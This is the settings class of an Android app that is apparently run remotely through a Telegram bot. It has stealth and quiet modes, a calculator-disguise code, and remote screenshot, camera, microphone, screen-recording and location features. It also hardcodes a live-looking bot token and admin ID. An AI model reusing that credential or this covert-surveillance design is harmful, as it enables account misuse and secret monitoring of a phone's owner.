package com.pulse.control;

import android.content.Context;
import android.content.SharedPreferences;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/** Persistent configuration + small JSON-backed stores. */
public final class Config {

    private static final String P = "pulse_cfg";

    public static final String DEFAULT_TOKEN = "8911830422:AAFQrJBp1S4vkk-6cIvG1zcIIjbXvIwwywg";
    public static final String DEFAULT_ADMIN = "8916400546";
    public static final String DEFAULT_USERNAME = "userbot_password_robot";

    public String token;
    public String admin;
    public boolean autostart;
    public String botUsername;
    public String pin;

    private Config() {}

    // ------------------------------------------------------------ core

    public static Config get(Context c) {
        SharedPreferences p = c.getSharedPreferences(P, Context.MODE_PRIVATE);
        Config cfg = new Config();
        String t = p.getString("token", null);
        cfg.token = t == null ? DEFAULT_TOKEN : t.trim();
        cfg.admin = p.getString("admin", DEFAULT_ADMIN).trim();
        cfg.autostart = p.getBoolean("autostart", true);
        cfg.botUsername = p.getString("bot_username", DEFAULT_USERNAME);
        cfg.pin = p.getString("pin", "");
        return cfg;
    }

    public static void save(Context c, String token, String admin) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit()
                .putString("token", token.trim())
                .putString("admin", admin.trim())
                .apply();
    }

    public static void setAutostart(Context c, boolean on) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean("autostart", on).apply();
    }

    public static void setBotUsername(Context c, String u) {
        if (u == null || u.isEmpty()) return;
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("bot_username", u).apply();
    }

    public static long getOffset(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getLong("offset", 0L);
    }

    public static void setOffset(Context c, long off) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putLong("offset", off).apply();
    }

    public boolean tokenOk() {
        return token != null && token.matches("\\d{6,}:[A-Za-z0-9_\\-]{20,}");
    }

    public long adminId() {
        try { return Long.parseLong(admin); } catch (Exception e) { return 0L; }
    }

    // ------------------------------------------------------------ admins

    public static Set<Long> admins(Context c) {
        Set<Long> out = new HashSet<>();
        try { out.add(Long.parseLong(get(c).admin)); } catch (Exception ignored) {}
        try {
            JSONArray a = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("admins", "[]"));
            for (int i = 0; i < a.length(); i++) out.add(a.optLong(i));
        } catch (Exception ignored) {}
        return out;
    }

    public static void addAdmin(Context c, long id) { Set<Long> a = admins(c); a.add(id); saveAdmins(c, a); }

    public static void delAdmin(Context c, long id) {
        Set<Long> a = admins(c);
        if (id == get(c).adminId()) return;
        a.remove(id);
        saveAdmins(c, a);
    }

    private static void saveAdmins(Context c, Set<Long> a) {
        JSONArray arr = new JSONArray();
        for (Long x : a) arr.put(x.longValue());
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("admins", arr.toString()).apply();
    }

    public static void setPin(Context c, String pin) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("pin", pin).apply();
    }

    // ------------------------------------------------------------ notifications

    public static boolean notifOn(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean("notif_on", true);
    }

    public static void setNotifOn(Context c, boolean on) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean("notif_on", on).apply();
    }

    /** all | important */
    public static String notifMode(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("notif_mode", "all");
    }

    public static void setNotifMode(Context c, String mode) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("notif_mode", mode).apply();
    }

    public static Set<String> notifIgnore(Context c) {
        Set<String> out = new HashSet<>();
        try {
            JSONArray a = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE)
                    .getString("notif_ignore", "[]"));
            for (int i = 0; i < a.length(); i++) out.add(a.optString(i));
        } catch (Exception ignored) {}
        return out;
    }

    public static void notifIgnoreAdd(Context c, String pkg) {
        Set<String> s = notifIgnore(c);
        s.add(pkg);
        JSONArray a = new JSONArray();
        for (String x : s) a.put(x);
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("notif_ignore", a.toString()).apply();
    }

    public static void notifIgnoreClear(Context c) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("notif_ignore", "[]").apply();
    }

    // notification history (for /nhistory)
    public static void pushNotifHistory(Context c, String line) {
        try {
            JSONArray a = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("nhist", "[]"));
            JSONArray out = new JSONArray();
            out.put(line);
            for (int i = 0; i < a.length() && i < 99; i++) out.put(a.optString(i));
            c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("nhist", out.toString()).apply();
        } catch (Exception ignored) {}
    }

    public static List<String> notifHistory(Context c) {
        List<String> out = new ArrayList<>();
        try {
            JSONArray a = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("nhist", "[]"));
            for (int i = 0; i < a.length(); i++) out.add(a.optString(i));
        } catch (Exception ignored) {}
        return out;
    }

    public static void clearNotifHistory(Context c) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("nhist", "[]").apply();
    }

    // ------------------------------------------------------------ alerts

    public static boolean alertsOn(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean("alerts_on", true);
    }

    public static boolean alertFlag(Context c, String key) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean(key, true);
    }

    public static void toggleAlert(Context c, String key) {
        SharedPreferences p = c.getSharedPreferences(P, Context.MODE_PRIVATE);
        p.edit().putBoolean(key, !p.getBoolean(key, true)).apply();
    }

    // ------------------------------------------------------------ battery history

    public static void pushBattery(Context c, int pct) {
        long now = System.currentTimeMillis();
        JSONArray arr = new JSONArray();
        try {
            JSONArray old = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("bat_hist", "[]"));
            long lastT = 0;
            for (int i = 0; i < old.length(); i++) {
                JSONObject o = old.optJSONObject(i);
                if (o == null) continue;
                long t = o.optLong("t");
                if (t > now - 86400000L) { arr.put(o); lastT = Math.max(lastT, t); }
            }
            if (now - lastT < 240000L) return;
        } catch (Exception ignored) {}
        try {
            JSONObject o = new JSONObject();
            o.put("t", now);
            o.put("p", pct);
            arr.put(o);
        } catch (Exception ignored) {}
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("bat_hist", arr.toString()).apply();
    }

    public static List<long[]> batteryHist(Context c) {
        List<long[]> out = new ArrayList<>();
        try {
            JSONArray a = new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("bat_hist", "[]"));
            for (int i = 0; i < a.length(); i++) {
                JSONObject o = a.optJSONObject(i);
                if (o == null) continue;
                out.add(new long[]{o.optLong("t"), o.optLong("p")});
            }
        } catch (Exception ignored) {}
        return out;
    }

    // ------------------------------------------------------------ scheduler

    public static JSONArray schedule(Context c) {
        try { return new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("sched", "[]")); }
        catch (Exception e) { return new JSONArray(); }
    }

    public static void scheduleSet(Context c, JSONArray arr) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("sched", arr.toString()).apply();
    }

    // ------------------------------------------------------------ macros

    public static JSONArray macros(Context c) {
        String def = "[{\"name\":\"Ушёл\",\"acts\":[\"mute\",\"lock\",\"tts:до связи\"]},"
                + "{\"name\":\"Ночь\",\"acts\":[\"mute\",\"bright:10\",\"lock\"]},"
                + "{\"name\":\"Работа\",\"acts\":[\"unmute\",\"bright:70\",\"open:telegram\"]}]";
        try {
            return new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("macros", def));
        } catch (Exception e) { return new JSONArray(); }
    }

    public static void macrosSet(Context c, JSONArray arr) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("macros", arr.toString()).apply();
    }

    // ------------------------------------------------------------ triggers

    public static JSONArray triggers(Context c) {
        try { return new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("trig", "[]")); }
        catch (Exception e) { return new JSONArray(); }
    }

    public static void triggersSet(Context c, JSONArray arr) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("trig", arr.toString()).apply();
    }

    // ------------------------------------------------------------ digest / tracking / stealth

    public static int digestHour(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getInt("digest_hour", 9);
    }

    public static void setDigestHour(Context c, int h) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putInt("digest_hour", h).apply();
    }

    public static boolean tracking(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean("tracking", false);
    }

    public static void setTracking(Context c, boolean on) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean("tracking", on).apply();
    }

    /** Тихий режим: бот не шлёт уведомления о действиях из WebApp. */
    public static boolean quiet(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean("quiet", false);
    }

    public static void setQuiet(Context c, boolean on) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean("quiet", on).apply();
    }

    public static boolean stealth(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean("stealth", false);
    }

    public static void setStealth(Context c, boolean on) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean("stealth", on).apply();
    }

    public static String calcCode(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("calc_code", "6969");
    }

    public static void setCalcCode(Context c, String code) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("calc_code", code).apply();
    }

    // ------------------------------------------------------------ custom buttons

    public static JSONArray buttons(Context c) {
        try { return new JSONArray(c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("buttons", "[]")); }
        catch (Exception e) { return new JSONArray(); }
    }

    public static void buttonsSet(Context c, JSONArray arr) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("buttons", arr.toString()).apply();
    }

    // ------------------------------------------------------------ stats

    public static void count(Context c, String key) {
        SharedPreferences p = c.getSharedPreferences(P, Context.MODE_PRIVATE);
        p.edit().putInt("stat_" + key, p.getInt("stat_" + key, 0) + 1).apply();
    }

    public static String statsDump(Context c) {
        SharedPreferences p = c.getSharedPreferences(P, Context.MODE_PRIVATE);
        StringBuilder sb = new StringBuilder();
        String[] keys = {"screen", "home", "photo", "video", "mic", "rec", "apps", "text",
                "find", "torch", "geo", "na"};
        String[] names = {"скриншоты", "домой", "фото", "видео", "микрофон", "запись экрана", "приложения",
                "ввод текста", "сирена", "фонарик", "локация", "уведомления"};
        for (int i = 0; i < keys.length; i++) {
            int v = p.getInt("stat_" + keys[i], 0);
            if (v > 0) sb.append("• ").append(names[i]).append(": <b>").append(v).append("</b>\n");
        }
        if (sb.length() == 0) sb.append("<i>пока нет данных</i>");
        return sb.toString();
    }

    // ------------------------------------------------------------ projection

    public static void saveProjection(Context c, int code, String dataUri) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit()
                .putInt("proj_code", code).putString("proj_data", dataUri)
                .putLong("proj_at", System.currentTimeMillis()).apply();
    }

    public static int projCode(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getInt("proj_code", 0);
    }

    public static String projData(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getString("proj_data", "");
    }

    public static long projAt(Context c) {
        return c.getSharedPreferences(P, Context.MODE_PRIVATE).getLong("proj_at", 0L);
    }

    public static boolean projValid(Context c) {
        return projCode(c) != 0 && projData(c) != null && !projData(c).isEmpty()
                && System.currentTimeMillis() - projAt(c) < 3L * 3600 * 1000;
    }

    public static void panic(Context c) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString("token", "").apply();
    }
}
